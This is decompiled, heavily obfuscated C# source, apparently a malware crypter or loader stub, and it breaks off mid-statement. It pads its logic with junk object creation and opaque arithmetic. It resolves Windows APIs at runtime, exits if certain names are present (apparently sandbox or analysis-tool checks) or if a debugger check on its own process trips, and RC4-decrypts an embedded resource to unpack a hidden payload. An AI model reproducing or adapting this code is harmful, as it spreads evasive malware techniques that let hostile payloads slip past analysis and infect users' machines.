using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Ports;
using System.Management;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.CSharp;

public class uGfhvHYfPGoZ
{
	private delegate IntPtr cF(string string_0);

	private delegate bool HF(IntPtr DF, ref bool eF);

	private delegate bool pF(IntPtr jF, UIntPtr JF, uint kF, out uint KF);

	private static IntPtr PF;

	[DllImport("kernel32")]
	private static extern IntPtr GetProcAddress(IntPtr qF, string QF);

	[DllImport("kernel32")]
	private static extern IntPtr LoadLibrary(string RF);

	private unsafe static void SF()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_082f: Unknown result type (might be due to invalid IL or missing references)
		//IL_083b: Unknown result type (might be due to invalid IL or missing references)
		//IL_084d: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0abe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b18: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b30: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b3c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b42: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b48: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bcf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c30: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c36: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c82: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c88: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c9d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ca9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0caf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ce9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e14: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e55: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e61: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f09: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f21: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f27: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f66: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f72: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f78: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f7e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fad: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fdb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fe7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fff: Unknown result type (might be due to invalid IL or missing references)
		//IL_1011: Unknown result type (might be due to invalid IL or missing references)
		//IL_1017: Unknown result type (might be due to invalid IL or missing references)
		//IL_1048: Unknown result type (might be due to invalid IL or missing references)
		//IL_105a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1060: Unknown result type (might be due to invalid IL or missing references)
		//IL_1083: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_1124: Unknown result type (might be due to invalid IL or missing references)
		//IL_1130: Unknown result type (might be due to invalid IL or missing references)
		//IL_1136: Unknown result type (might be due to invalid IL or missing references)
		//IL_113c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1159: Unknown result type (might be due to invalid IL or missing references)
		//IL_116b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1171: Unknown result type (might be due to invalid IL or missing references)
		//IL_1177: Unknown result type (might be due to invalid IL or missing references)
		//IL_12ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1333: Unknown result type (might be due to invalid IL or missing references)
		//IL_1449: Unknown result type (might be due to invalid IL or missing references)
		//IL_1467: Unknown result type (might be due to invalid IL or missing references)
		//IL_1473: Unknown result type (might be due to invalid IL or missing references)
		//IL_1479: Unknown result type (might be due to invalid IL or missing references)
		//IL_17e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_17f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1812: Unknown result type (might be due to invalid IL or missing references)
		//IL_1818: Unknown result type (might be due to invalid IL or missing references)
		//IL_1aa6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1aac: Unknown result type (might be due to invalid IL or missing references)
		//IL_1adb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ae1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cb3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cb9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ccc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cd2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cde: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ce4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cea: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cf0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e27: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e39: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e64: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f03: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f09: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f15: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f27: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f33: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f82: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f88: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f8e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fac: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fba: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fc1: Expected O, but got Unknown
		//IL_2101: Unknown result type (might be due to invalid IL or missing references)
		//IL_210d: Unknown result type (might be due to invalid IL or missing references)
		//IL_213d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2149: Unknown result type (might be due to invalid IL or missing references)
		//IL_214f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2164: Unknown result type (might be due to invalid IL or missing references)
		//IL_2189: Unknown result type (might be due to invalid IL or missing references)
		//IL_218f: Unknown result type (might be due to invalid IL or missing references)
		//IL_219b: Unknown result type (might be due to invalid IL or missing references)
		//IL_21ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_21b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_21cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_21d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_21d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_2220: Unknown result type (might be due to invalid IL or missing references)
		//IL_222c: Unknown result type (might be due to invalid IL or missing references)
		//IL_233f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2345: Unknown result type (might be due to invalid IL or missing references)
		//IL_235d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2385: Unknown result type (might be due to invalid IL or missing references)
		//IL_2391: Unknown result type (might be due to invalid IL or missing references)
		//IL_2397: Unknown result type (might be due to invalid IL or missing references)
		new List<char>();
		new ManagementObject();
		byte[] array = new byte[Convert.ToInt32(545759.0)];
		try
		{
			Array.Reverse((Array)array);
		}
		catch
		{
		}
		new FileSystemWatcher();
		new ManagementEventWatcher();
		new ManagementClass();
		new PerformanceCounter();
		uint num = (uint)Convert.ToInt32(1039947.0 - Math.Truncate(346649.0));
		new FileSystemWatcher();
		num += (uint)Convert.ToInt32(494709.0);
		new FileSystemWatcher();
		string text = _003CModule_003E.Qf((string)_003CModule_003E.Uf());
		new Ping();
		new ManagementEventWatcher();
		text += Convert.ToInt32(74796.0);
		string text2 = _003CModule_003E.Qf((string)_003CModule_003E.vf());
		new ProcessStartInfo();
		new Process();
		new ProcessStartInfo();
		new PerformanceCounter();
		new List<float>();
		new Ping();
		new Process();
		text2 += Convert.ToInt32(123406.8527924598 - Math.Sin(61703.0));
		PF = LoadLibrary(_003CModule_003E.Qf((string)_003CModule_003E.Vf()));
		new Stack<char>();
		new ManagementObject();
		new Process();
		new ManagementClass();
		_ = (pF)Marshal.GetDelegateForFunctionPointer(GetProcAddress(PF, _003CModule_003E.Qf((string)_003CModule_003E.wf())), typeof(pF));
		new ProcessStartInfo();
		new SerialPort();
		new SerialPort();
		new PerformanceCounter();
		new EventLog();
		new ManagementClass();
		string text3 = _003CModule_003E.Qf((string)_003CModule_003E.Wf());
		int num2 = -1756;
		if ((Convert.ToInt32(20303.0 + Math.Floor(20303.0)) ^ Convert.ToInt32(297125.2821438735 + Math.Tan(148562.5))) == Convert.ToInt32(267833.90666494035 + Math.Tan(133917.5)))
		{
			Convert.ToInt32(3.0 - Math.Sqrt(1.0));
			num2 = num2 + sizeof(double) + Convert.ToInt32(1749.0);
		}
		string[] array2 = new string[num2];
		int num3 = Convert.ToInt32(-1504.0);
		if ((Convert.ToInt32(315111.9964768834 + Math.Sin(157555.5)) ^ Convert.ToInt32(443214.5851070878 - Math.Cos(221607.0))) == Convert.ToInt32(134568.15309473083 - Math.Sin(67284.5)))
		{
			num3 = num3 + sizeof(double) + Convert.ToInt32(1496.2964261583256 - Math.Sin(748.0));
		}
		array2[num3] = _003CModule_003E.Qf((string)_003CModule_003E.xf());
		int num4 = -9826;
		if ((Convert.ToInt32(688138.251383611 + Math.Log(344075.5)) ^ 0x3041F) == Convert.ToInt32(623636.6501557211 - Math.Log(311812.0)))
		{
			Convert.ToInt32(2.0 + Math.Log10(1.0));
			num4 = num4 + sizeof(double) + 9818;
		}
		string[] array3 = text3.Split(array2, (StringSplitOptions)num4);
		string text4 = _003CModule_003E.Qf((string)_003CModule_003E.Xf());
		text4 += Convert.ToInt32(631630.7245766388 - Math.Sqrt(315534.5));
		Console.WriteLine(text4);
		byte[] array4 = new byte[Convert.ToInt32(170912.6441728883 + Math.Log(85462.0))];
		string[] array5 = new string[Convert.ToInt32(6.58113883008419 - Math.Sqrt(2.5))];
		int num5 = Convert.ToInt32(-5861.0);
		if ((Convert.ToInt32(956593.0779725221 - Math.Log(478290.0)) ^ Convert.ToInt32(876374.0)) == Convert.ToInt32(371691.0 - Math.Ceiling(123897.0)))
		{
			Convert.ToInt32(2.0);
			num5 = num5 + sizeof(double) + Convert.ToInt32(5856.46634852845 - Math.Log10(2926.5));
		}
		array5[num5] = text4;
		int num6 = Convert.ToInt32(-1565.0);
		if ((Convert.ToInt32(172615.0) ^ Convert.ToInt32(557323.6137725384 + Math.Cos(278661.5))) == Convert.ToInt32(664395.0418636793 + Math.Cos(332198.0)))
		{
			num6 = num6 + sizeof(double) + Convert.ToInt32(779.0 + Math.Abs(779.0));
		}
		array5[num6] = text4;
		array5[Convert.ToInt32(1.0 + Math.Ceiling(1.0))] = text4;
		array5[Convert.ToInt32(3.4054651081081646 - Math.Log(1.5))] = text4;
		array5[Convert.ToInt32(3.5838531634528574 - Math.Cos(2.0))] = text4;
		string text5 = string.Concat(array5);
		try
		{
			int num7 = Convert.ToInt32(-6840.0);
			if ((Convert.ToInt32(481776.5 + Math.Abs(481776.5)) ^ Convert.ToInt32(542721.0)) == Convert.ToInt32(686544.0 - Math.Truncate(228848.0)))
			{
				Convert.ToInt32(1.0 + Math.Round(1.0));
				num7 = num7 + sizeof(double) + Convert.ToInt32(6823.863774445092 + Math.Log(3416.0));
			}
			BitConverter.ToInt32(array4, num7);
		}
		catch
		{
		}
		new Ping();
		try
		{
			Array.Reverse((Array)array4);
		}
		catch
		{
		}
		new ManagementObjectSearcher();
		new Stack<uint>();
		try
		{
			int num8 = Convert.ToInt32(-9256.0);
			if ((Convert.ToInt32(325483.0) ^ Convert.ToInt32(487193.0)) == Convert.ToInt32(235633.0 + Math.Tanh(117817.0)))
			{
				Convert.ToInt32(3.0 - Math.Truncate(1.0));
				num8 = num8 + sizeof(double) + Convert.ToInt32(4624.0 + Math.Truncate(4624.0));
			}
			BitConverter.ToInt32(array4, num8);
		}
		catch
		{
		}
		new List<long>();
		string text6 = text5;
		Convert.ToInt32(455862548.0);
		int num9 = Convert.ToInt32(227926952.0 + Math.Ceiling(227926952.0));
		if ((Convert.ToInt32(689749.0) ^ Convert.ToInt32(441063.0 + Math.Truncate(441062.5))) == Convert.ToInt32(781668.0 - Math.Floor(260556.0)))
		{
			Convert.ToInt32(1.0 + Math.Sqrt(1.0));
			num9 = num9 + sizeof(double) + Convert.ToInt32(8636.118820973612 - Math.Cos(4318.0));
		}
		Convert.ToInt32(456097824.358028 - Math.Log10(228048908.0));
		int num10 = Convert.ToInt32(456090685.3580212 - Math.Log10(228045338.5));
		if ((Convert.ToInt32(997270.0 - Math.Tanh(498634.5)) ^ Convert.ToInt32(233447.0 + Math.Ceiling(233447.0))) == Convert.ToInt32(534619.0))
		{
			Convert.ToInt32(2.5403023058681398 - Math.Cos(1.0));
			num10 = num10 + sizeof(double) + Convert.ToInt32(10697.0 - Math.Ceiling(3565.5));
		}
		text5 = text6 + (num9 ^ num10);
		new ManagementEventWatcher();
		cF cF = (cF)Marshal.GetDelegateForFunctionPointer(GetProcAddress(PF, _003CModule_003E.Qf((string)_003CModule_003E.yf())), typeof(cF));
		new ManagementObjectSearcher();
		new Random();
		new SerialPort();
		new FileSystemWatcher();
		new Random();
		new SerialPort();
		new Process();
		new Random();
		new Stack<int>();
		string[] array6 = array3;
		int num11 = Convert.ToInt32(-8997.0);
		if ((Convert.ToInt32(1290367.5 - Math.Abs(430122.5)) ^ Convert.ToInt32(318538.2021244362 - Math.Log10(159266.5))) == Convert.ToInt32(327176.0 + Math.Floor(327176.0)))
		{
			Convert.ToInt32(1.4596976941318602 + Math.Cos(1.0));
			num11 = num11 + sizeof(double) + Convert.ToInt32(4495.0 + Math.Truncate(4494.5));
		}
		int num12 = num11;
		while (num12 < array6.Length)
		{
			string string_ = array6[num12];
			if (cF(string_).ToInt32() != 0)
			{
				tF();
			}
			int num13 = num12;
			int num14 = Convert.ToInt32(-4149.0);
			if ((Convert.ToInt32(484722.0) ^ Convert.ToInt32(188194.0)) == Convert.ToInt32(563064.0 - Math.Ceiling(187688.0)))
			{
				Convert.ToInt32(2.0 - Math.Log(1.0));
				num14 = num14 + sizeof(double) + Convert.ToInt32(4096.491758988069 + Math.Sqrt(2071.0));
			}
			num12 = num13 + num14;
		}
		new ManagementClass();
		new Random();
		new ManagementClass();
		new ProcessStartInfo();
		new Stack<uint>();
		new Process();
		int num15 = Convert.ToInt32(-2453.0);
		if ((Convert.ToInt32(262379.54862395074 + Math.Sqrt(131371.0)) ^ Convert.ToInt32(461657.47967194126 + Math.Tan(230829.0))) == Convert.ToInt32(298386.0 - Math.Abs(99462.0)))
		{
			Convert.ToInt32(2.0);
			num15 = num15 + sizeof(double) + Convert.ToInt32(2446.0 - Math.Tanh(1222.5));
		}
		bool eF = (byte)num15 != 0;
		byte[] array7 = new byte[Convert.ToInt32(477249.0 - Math.Round(159083.0))];
		new Ping();
		try
		{
			Array.Reverse((Array)array7);
		}
		catch
		{
		}
		new ProcessStartInfo();
		new SerialPort();
		new List<double>();
		HF hF = (HF)Marshal.GetDelegateForFunctionPointer(GetProcAddress(PF, _003CModule_003E.Qf((string)_003CModule_003E.Yf())), typeof(HF));
		byte[] value = new byte[Convert.ToInt32(961152.0 - Math.Round(320384.0))];
		new SerialPort();
		new List<ulong>();
		new FileSystemWatcher();
		new SerialPort();
		new PerformanceCounter();
		new FileSystemWatcher();
		new ManagementClass();
		new SerialPort();
		new PerformanceCounter();
		new ManagementEventWatcher();
		try
		{
			int num16 = Convert.ToInt32(-9243.0);
			if ((Convert.ToInt32(71478.0) ^ Convert.ToInt32(120635.0 + Math.Round(120635.5))) == Convert.ToInt32(178497.0))
			{
				Convert.ToInt32(2.0);
				num16 = num16 + sizeof(double) + Convert.ToInt32(13852.5 - Math.Abs(4617.5));
			}
			BitConverter.ToInt32(value, num16);
		}
		catch
		{
		}
		new ManagementClass();
		new SerialPort();
		hF(Process.GetCurrentProcess().Handle, ref eF);
		int num17 = Convert.ToInt32(338698.5 + Math.Abs(338698.5));
		num17 += Convert.ToInt32(40889.76418045754 + Math.Sqrt(20516.5));
		new ManagementClass();
		new ManagementObjectSearcher();
		new Process();
		num17 += Convert.ToInt32(341929.0 + Math.Truncate(341928.5));
		new Ping();
		new EventLog();
		new ManagementClass();
		new Process();
		new List<ulong>();
		new ManagementObjectSearcher();
		new EventLog();
		new Process();
		if (eF)
		{
			tF();
		}
		new ManagementEventWatcher();
		new Ping();
		new ManagementEventWatcher();
		new ManagementEventWatcher();
		new SerialPort();
		new Ping();
		new Process();
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(_003CModule_003E.Qf((string)_003CModule_003E.zf()));
		new ProcessStartInfo();
		new List<long>();
		new ManagementEventWatcher();
		new Process();
		new ManagementEventWatcher();
		byte[] value2 = new byte[Convert.ToInt32(47524.14617022086 - Math.Tan(23761.0))];
		new ProcessStartInfo();
		try
		{
			int num18 = Convert.ToInt32(-4721.0);
			if ((Convert.ToInt32(19051.0 + Math.Round(19051.0)) ^ Convert.ToInt32(771337.0 - Math.Truncate(257112.5))) == Convert.ToInt32(478800.0352748013 - Math.Sqrt(239155.5)))
			{
				Convert.ToInt32(1.0 + Math.Sqrt(1.0));
				num18 = num18 + sizeof(double) + Convert.ToInt32(4713.300779414642 - Math.Sin(2356.5));
			}
			BitConverter.ToInt32(value2, num18);
		}
		catch
		{
		}
		new PerformanceCounter();
		byte[] array8 = new byte[manifestResourceStream.Length];
		ulong num19 = (ulong)Convert.ToInt32(566931.4288574583 + Math.Tan(283465.5));
		new PerformanceCounter();
		new ManagementObject();
		new EventLog();
		num19 += (ulong)Convert.ToInt32(163028.0 + Math.Abs(163028.0));
		new ProcessStartInfo();
		new SerialPort();
		new ManagementClass();
		new PerformanceCounter();
		new ManagementClass();
		new PerformanceCounter();
		int num20 = Convert.ToInt32(-1774.0);
		if ((Convert.ToInt32(101855.0) ^ Convert.ToInt32(718323.7915107213 - Math.Log(359155.5))) == Convert.ToInt32(751673.0 - Math.Tanh(375836.0)))
		{
			Convert.ToInt32(1.0 + Math.Ceiling(1.0));
			num20 = num20 + sizeof(double) + Convert.ToInt32(2649.0 - Math.Abs(883.0));
		}
		manifestResourceStream.Read(array8, num20, array8.Length);
		new ManagementEventWatcher();
		new ManagementObject();
		new Ping();
		new List<string>();
		new ManagementClass();
		new EventLog();
		manifestResourceStream.Close();
		new Random();
		new PerformanceCounter();
		new Random();
		ulong num21 = (ulong)Convert.ToInt32(736575.0 - Math.Abs(245525.0));
		new PerformanceCounter();
		new Ping();
		new ManagementObject();
		new ManagementClass();
		new ManagementObjectSearcher();
		num21 += (ulong)Convert.ToInt32(805861.0 - Math.Tanh(402930.0));
		new ProcessStartInfo();
		new ManagementObject();
		new Random();
		byte[] bytes = Encoding.UTF8.GetBytes(_003CModule_003E.Qf((string)_003CModule_003E.Zf()));
		new Random();
		new EventLog();
		new ManagementObject();
		new Process();
		new SerialPort();
		new ManagementObjectSearcher();
		new Stack<int>();
		new List<long>();
		new EventLog();
		string text7 = _003CModule_003E.Qf((string)_003CModule_003E.smethod_0());
		new ManagementObject();
		new ManagementObjectSearcher();
		text7 += Convert.ToInt32(991411.0707339831 + Math.Cos(495706.0));
		new ManagementObjectSearcher();
		new List<float>();
		new Process();
		new ManagementObject();
		new ManagementEventWatcher();
		byte[] array9 = new byte[Convert.ToInt32(499946.0)];
		try
		{
			Array.Reverse((Array)array9);
		}
		catch
		{
		}
		new SerialPort();
		new Process();
		int[] array10 = new int[Convert.ToInt32(256.0)];
		long num22 = Convert.ToInt32(827088.0);
		new ManagementEventWatcher();
		new Stack<string>();
		new ManagementClass();
		new List<float>();
		new ProcessStartInfo();
		num22 += Convert.ToInt32(877927.2066687118 + Math.Sqrt(439295.0));
		new ManagementClass();
		new Process();
		new FileSystemWatcher();
		int[] array11 = new int[Convert.ToInt32(128.0 + Math.Round(128.0))];
		new ManagementObject();
		new List<int>();
		new PerformanceCounter();
		new PerformanceCounter();
		new ManagementObjectSearcher();
		new ProcessStartInfo();
		new Ping();
		byte[] array12 = new byte[array8.Length];
		new ManagementObject();
		new Ping();
		new Ping();
		new ManagementObjectSearcher();
		new ManagementObject();
		new ManagementObject();
		Convert.ToInt32(2645493276.0 - Math.Floor(881831092.0));
		int num23 = Convert.ToInt32(1763654719.0546165 + Math.Log10(881827364.0));
		if ((0xD1312 ^ Convert.ToInt32(292437.0)) == Convert.ToInt32(615750.0 + Math.Tanh(307875.5)))
		{
			Convert.ToInt32(2.0);
			num23 = num23 + sizeof(double) + Convert.ToInt32(11172.0 - Math.Round(3724.0));
		}
		Convert.ToInt32(2645181825.0 - Math.Abs(881727275.0));
		int num24 = Convert.ToInt32(1763448548.5816038 + Math.Cos(881724274.0));
		if ((Convert.ToInt32(957257.6495236618 - Math.Tan(478628.5)) ^ Convert.ToInt32(225547.0)) == Convert.ToInt32(911943.2866860522 - Math.Tan(455969.0)))
		{
			Convert.ToInt32(3.0 - Math.Round(1.0));
			num24 = num24 + sizeof(double) + Convert.ToInt32(5994.0);
		}
		long num25 = num23 ^ num24;
		ulong num26 = (ulong)Convert.ToInt32(187171.0 + Math.Ceiling(187171.5));
		new ManagementClass();
		new SerialPort();
		num25 += Convert.ToInt32(357259.0 + Math.Ceiling(357259.0));
		new FileSystemWatcher();
		num26 += (ulong)Convert.ToInt32(80707.0);
		new ManagementEventWatcher();
		int num27 = Convert.ToInt32(-7485.0);
		if ((Convert.ToInt32(854443.0) ^ Convert.ToInt32(501849.0 - Math.Floor(167283.0))) == Convert.ToInt32(529234.4226136385 - Math.Log10(264614.5)))
		{
			Convert.ToInt32(2.0);
			num27 = num27 + sizeof(double) + 7477;
		}
		int num28 = num27;
		while (num28 < Convert.ToInt32(256.0))
		{
			array10[num28] = bytes[num28 % bytes.Length];
			array11[num28] = num28;
			int num29 = num28;
			int num30 = Convert.ToInt32(-5901.0);
			if ((Convert.ToInt32(67620.0) ^ Convert.ToInt32(596871.0)) == Convert.ToInt32(528800.5512659166 + Math.Sqrt(264657.5)))
			{
				Convert.ToInt32(2.0);
				num30 = num30 + sizeof(double) + Convert.ToInt32(2947.0 + Math.Abs(2947.0));
			}
			num28 = num29 + num30;
		}
		new Stack<int>();
		new ManagementObject();
		new Process();
		string text8 = _003CModule_003E.Qf((string)_003CModule_003E.smethod_1());
		new ProcessStartInfo();
		new ManagementObjectSearcher();
		new Ping();
		new ManagementObjectSearcher();
		new ManagementEventWatcher();
		new Random();
		text8 += Convert.ToInt32(873055.0133784565 + Math.Log(436534.0));
		int num31 = Convert.ToInt32(-9000.0);
		if ((Convert.ToInt32(113616.0 + Math.Round(113616.0)) ^ Convert.ToInt32(114614.24177338055 + Math.Log10(57309.5))) == Convert.ToInt32(91149.5 + Math.Abs(91149.5)))
		{
			Convert.ToInt32(2.8414709848078967 - Math.Sin(1.0));
			num31 = num31 + sizeof(double) + Convert.ToInt32(4496.0 + Math.Truncate(4496.0));
		}
		num28 = num31;
		int num32 = num31;
		while (num28 < Convert.ToInt32(256.0))
		{
			int num33 = num32 + array11[num28] + array10[num28];
			Convert.ToInt32(75057326.0 + Math.Truncate(75057325.5));
			int num34 = Convert.ToInt32(150108417.12462494 + Math.Log10(75054212.5));
			if ((Convert.ToInt32(51370.8370444012 - Math.Tan(25685.5)) ^ Convert.ToInt32(551538.0 - Math.Round(183846.0))) == Convert.ToInt32(349414.07544919 - Math.Cos(174707.5)))
			{
				Convert.ToInt32(2.0 + Math.Log10(1.0));
				num34 = num34 + sizeof(double) + Convert.ToInt32(3109.0 + Math.Abs(3109.0));
			}
			Convert.ToInt32(225171593.0 - Math.Round(75057197.5));
			int num35 = Convert.ToInt32(150111719.95591158 - Math.Cos(75055859.5));
			if ((Convert.ToInt32(92773.0 + Math.Ceiling(92773.0)) ^ Convert.ToInt32(918257.0 - Math.Tanh(459128.0))) == Convert.ToInt32(841922.5653398078 - Math.Sqrt(420637.0)))
			{
				Convert.ToInt32(2.8414709848078967 - Math.Sin(1.0));
				num35 = num35 + sizeof(double) + 2668;
			}
			num32 = num33 % (num34 ^ num35);
			int num36 = array11[num28];
			array11[num28] = array11[num32];
			array11[num32] = num36;
			int num37 = num28;
			int num38 = Convert.ToInt32(-3192.0);
			if ((Convert.ToInt32(243392.0 + Math.Tanh(121696.5)) ^ Convert.ToInt32(322869.96020097507 + Math.Sqrt(161636.0))) == Convert.ToInt32(721933.5 - Math.Abs(240644.5)))
			{
				Convert.ToInt32(2.0 - Math.Log10(1.0));
				num38 = num38 + sizeof(double) + Convert.ToInt32(4778.0 - Math.Ceiling(1592.5));
			}
			num28 = num37 + num38;
		}
		new ManagementEventWatcher();
		new Ping();
		new Process();
		new ManagementObjectSearcher();
		new FileSystemWatcher();
		string value3 = _003CModule_003E.Qf((string)_003CModule_003E.smethod_2());
		Console.WriteLine(value3);
		new ManagementClass();
		new EventLog();
		new ProcessStartInfo();
		new Process();
		new Random();
		int num39 = Convert.ToInt32(-9426.0);
		if ((Convert.ToInt32(609987.0 - Math.Floor(203329.0)) ^ Convert.ToInt32(912183.0)) == Convert.ToInt32(778164.4283179865 + Math.Sin(389082.5)))
		{
			Convert.ToInt32(2.0 - Math.Log10(1.0));
			num39 = num39 + sizeof(double) + Convert.ToInt32(9426.457230850243 - Math.Log(4709.0));
		}
		num28 = num39;
		num32 = num39;
		int num40 = num39;
		while (num28 < array8.Length)
		{
			int num41 = num40;
			int num42 = -2755;
			if ((Convert.ToInt32(417518.1673774196 - Math.Sin(208759.0)) ^ Convert.ToInt32(79897.0 + Math.Round(79897.5))) == Convert.ToInt32(411211.0 - Math.Truncate(137070.5)))
			{
				Convert.ToInt32(1.0 + Math.Sqrt(1.0));
				num42 = num42 + sizeof(double) + Convert.ToInt32(2748.0);
			}
			num40 = num41 + num42;
			num40 %= Convert.ToInt32(257.0406148914329 + Math.Tan(128.0));
			num32 += array11[num40];
			num32 %= Convert.ToInt32(256.0);
			int num36 = array11[num40];
			array11[num40] = array11[num32];
			array11[num32] = num36;
			int num43 = array11[(array11[num40] + array11[num32]) % Convert.ToInt32(128.0 + Math.Abs(128.0))];
			array12[num28] = (byte)(array8[num28] ^ num43);
			int num44 = num28;
			int num45 = Convert.ToInt32(-2368.0);
			if ((Convert.ToInt32(548778.0) ^ Convert.ToInt32(923255.0378487546 - Math.Tan(461628.0))) == 412114)
			{
				Convert.ToInt32(2.0 - Math.Log(1.0));
				num45 = num45 + sizeof(double) + Convert.ToInt32(1180.0 + Math.Ceiling(1180.5));
			}
			num28 = num44 + num45;
		}
		long num46 = Convert.ToInt32(672021.0739315095 - Math.Sin(336011.0));
		new Process();
		new ManagementClass();
		new ManagementObject();
		num46 += Convert.ToInt32(405548.2198177473 - Math.Log(202768.0));
		new Process();
		new PerformanceCounter();
		new PerformanceCounter();
		num46 += Convert.ToInt32(511604.00615663914 + Math.Sin(255802.5));
		uint num47 = (uint)Convert.ToInt32(537472.3522389907 + Math.Sqrt(268995.5));
		long num48 = num46;
		Convert.ToInt32(1126007062.9222875 - Math.Cos(563003531.0));
		int num49 = Convert.ToInt32(1125997686.0);
		if ((Convert.ToInt32(662204.0) ^ Convert.ToInt32(651135.8964603331 + Math.Sin(325567.5))) == Convert.ToInt32(259520.72266143395 + Math.Tan(129761.5)))
		{
			Convert.ToInt32(2.0);
